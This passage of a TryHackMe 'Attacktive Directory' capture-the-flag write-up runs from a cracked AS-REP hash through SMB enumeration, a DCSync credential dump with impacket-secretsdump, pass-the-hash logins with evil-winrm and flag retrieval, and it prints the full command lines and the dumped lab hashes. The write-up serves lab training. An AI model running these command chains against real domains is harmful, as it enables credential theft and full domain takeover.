$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:d13488f096ca4f71e272685413a14b15$8d4c1ac0b0f68058e89da48673e2966be090dafefe10576c9c82f62172c8016c4574df737a05e16b6ad7c1e1cdffada894fe1c2f8f9a3e42fa84d283d589347b03de4e95381dc08babf56d00f63030abb1c694b53c30e414490366c3d4090e292622c63e67f0b4af1dc46e10da837cb461a8695763fa961b99c59135ceb62b9b68f48558d25962a3d58136f218516489a694ca8f4734d1296492a7cb49ec61dfbdfc56baa65ea3ad19254d1175ba62b71079f10d37a393a6894d0453cc3ae9884a3fd456801eb52d8230a348d588d14e80ac2852e0c8fb94110ee2ac1b9dc3b9ad4c066b1eac5acd5ca7f1501fd4d654fc75:management2005
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:d13488f096c...54fc75
Time.Started.....: Mon Apr 27 15:14:05 2026 (0 secs)
Time.Estimated...: Mon Apr 27 15:14:05 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1224.2 kH/s (1.60ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/70188 (11.67%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/70188 (5.84%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> whitey
Hardware.Mon.#1..: Util: 14%

Started: Mon Apr 27 15:14:03 2026
Stopped: Mon Apr 27 15:14:07 2026
```

Answer: `management2005`

---------------------------------------------------------------------------------------

### Task 6: Enumeration - Back to the Basics

#### Enumeration via SMB

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

---------------------------------------------------------------------------------------

#### What utility can we use to map remote SMB shares?

Hint: `man smbclient` will tell you a little bit about the tool!

Answer: `smbclient`

#### Which option will list shares?

Hint: `man smbclient` will tell you a little bit about the tool!

Answer: `-L`

#### How many remote shares is the server listing?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ smbclient -L $TARGET_IP -U spookysec.local/svc-admin --password=management2005

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.112.162.144 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Answer: `6`

#### There is one particular share that we have access to that contains a text file. Which share is it?

Answer: `backup`

### What is the content of the file?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ smbclient -U spookysec.local/svc-admin --password=management2005 //$TARGET_IP/backup
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

                8247551 blocks of size 4096. 3944488 blocks available
smb: \> mget b*
Get file backup_credentials.txt? y
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> quit

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw   
```

Answer: `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`

#### Decoding the contents of the file, what is the full contents?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ cat backup_credentials.txt | base64 -d                           
backup@spookysec.local:backup2517860  
```

Answer: `backup@spookysec.local:backup2517860`

---------------------------------------------------------------------------------------

### Task 7: Domain Privilige Escalation - Elevating Priviliges within the Domain

#### Let's Sync Up

Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to?

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes

![Spookysec Backup Access](Images/Spookysec_Backup_Access.png)

Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

---------------------------------------------------------------------------------------

### What method allowed us to dump NTDS.DIT?

Hint: Read the secretsdump output!

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ impacket-secretsdump -just-dc spookysec.local/backup:backup2517860@$TARGET_IP 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:314e9d52d5e42200fa7b3a1c2ff1e8d0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:c7c33665ea563ba5237941c2cdb1f0421bf1e5162f43a9eef9f5c6123053af74
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:f4ddb3a69039e79f61abb99336f4f853
ATTACKTIVEDIREC$:des-cbc-md5:f7bf266d67c8917a
[*] Cleaning up... 
```

Answer: `DRSUAPI`

### What is the Administrators NTLM hash?

See the output above. The format is `(domain\uid:rid:lmhash:nthash)`

Answer: `0e0363213e37b94221497260b0bcb4fc`

### What method of attack could allow us to authenticate as the user without the password?

Answer: `Pass The Hash`

### Using a tool called Evil-WinRM what option will allow us to use a hash?

Hint: if Evil-WinRM is not installed, you can do so by issuing "gem install evil-winrm"

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ evil-winrm -i $TARGET_IP -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                          Attributes
============================================= ================ ============================================ ===============================================================
Everyone                                      Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                        Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Remote Desktop Users                  Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
THM-AD\Group Policy Creator Owners            Group            S-1-5-21-3591857110-2884097990-301047963-520 Mandatory group, Enabled by default, Enabled group
THM-AD\Domain Admins                          Group            S-1-5-21-3591857110-2884097990-301047963-512 Mandatory group, Enabled by default, Enabled group
THM-AD\Enterprise Admins                      Group            S-1-5-21-3591857110-2884097990-301047963-519 Mandatory group, Enabled by default, Enabled group
THM-AD\Schema Admins                          Group            S-1-5-21-3591857110-2884097990-301047963-518 Mandatory group, Enabled by default, Enabled group
THM-AD\Denied RODC Password Replication Group Alias            S-1-5-21-3591857110-2884097990-301047963-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level          Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Answer: `-H`

---------------------------------------------------------------------------------------

### Task 8: Flag Submission - Flag Submission Panel

#### svc-admin

Connect with RDP as `svc-admin`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ xfreerdp /v:$TARGET_IP /cert:ignore /u:'svc-admin' /p:'management2005' /d:spookysec.local /h:1024 /w:1500 +clipboard 
[16:14:32:312] [211905:211906] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[16:14:32:312] [211905:211906] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[16:14:32:505] [211905:211906] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[16:14:32:505] [211905:211906] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[16:14:35:240] [211905:211906] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
<---snip--->
```

The flag is located on the Desktop and is called `user.txt`.

Answer: `TryHackMe{<REDACTED>}`

#### backup

Connect with RDP as `backup`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ xfreerdp /v:$TARGET_IP /cert:ignore /u:'backup' /p:'backup2517860' /d:spookysec.local /h:1024 /w:1500 +clipboard
[16:18:28:567] [213903:213904] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[16:18:28:567] [213903:213904] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[16:18:28:696] [213903:213904] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[16:18:28:696] [213903:213904] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[16:18:30:063] [213903:213904] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING [LOGON_MSG_SESSION_CONTINUE]
<---snip--->
```

The flag is located on the Desktop and is called `PrivEsc.txt`.

Answer: `TryHackMe{<REDACTED>}`

#### Administrator

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ evil-winrm -i $TARGET_IP -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
TryHackMe{<REDACTED>}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> exit
                                        
Info: Exiting with code 0
                                                                                                                                                                                                                        
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Attacktive_Directory]
└─$ 
```

Answer: `TryHackMe{<REDACTED>}`

---------------------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [Active Directory - Wikipedia](https://en.wikipedia.org/wiki/Active_Directory)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [BloodHound - Docs](https://bloodhound.specterops.io/home)
- [BloodHound - GitHub](https://github.com/SpecterOps/BloodHound)
- [BloodHound - Homepage](https://specterops.io/open-source-tools/bloodhound-community-edition/)
- [BloodHound - Kali Tools](https://www.kali.org/tools/bloodhound/)
- [BloodHound - Query Library](https://queries.specterops.io/)
- [enum4linux - GitHub](https://github.com/CiscoCXSecurity/enum4linux)
- [enum4linux - Homepage](https://labs.portcullis.co.uk/tools/enum4linux/)
- [enum4linux - Kali Tools](https://www.kali.org/tools/enum4linux/)
- [enum4linux-ng - GitHub](https://github.com/cddmp/enum4linux-ng)
- [enum4linux-ng - Kali Tools](https://www.kali.org/tools/enum4linux-ng/)
- [Evil-WinRM - GitHub](https://github.com/Hackplayers/evil-winrm)
- [Evil-WinRM - Kali Tools](https://www.kali.org/tools/evil-winrm/)
- [Hashcat - Homepage](https://hashcat.net/hashcat/)
- [Hashcat - Kali Tools](https://www.kali.org/tools/hashcat/)
- [Hashcat - Wiki](https://hashcat.net/wiki/)
- [Impacket - GitHub](https://github.com/fortra/impacket)
- [Impacket - Homepage](https://www.coresecurity.com/core-labs/impacket)
- [Impacket - Kali Tools](https://www.kali.org/tools/impacket/)
- [Impacket-scripts - Kali Tools](https://www.kali.org/tools/impacket-scripts/)
- [Kerberos (protocol) - Wikipedia](https://en.wikipedia.org/wiki/Kerberos_(protocol))
- [Kerbrute - GitHub](https://github.com/ropnop/kerbrute)
- [Lightweight Directory Access Protocol - Wikipedia](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol)
- [Neo4j - Wikipedia](https://en.wikipedia.org/wiki/Neo4j)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenVPN - Homepage](https://openvpn.net/)
- [Pass the hash - Wikipedia](https://en.wikipedia.org/wiki/Pass_the_hash)
- [Remote Desktop Protocol - Wikipedia](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)
- [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
- [smbclient - Kali Tools](https://www.kali.org/tools/samba/#smbclient)
- [smbclient - Linux manual page](https://linux.die.net/man/1/smbclient)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [whoami - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
- [Windows Remote Management - Wikipedia](https://en.wikipedia.org/wiki/Windows_Remote_Management)
- [xfreerdp - Kali Tools](https://www.kali.org/tools/freerdp3/#xfreerdp)
- [xfreerdp - Linux manual page](https://linux.die.net/man/1/xfreerdp)
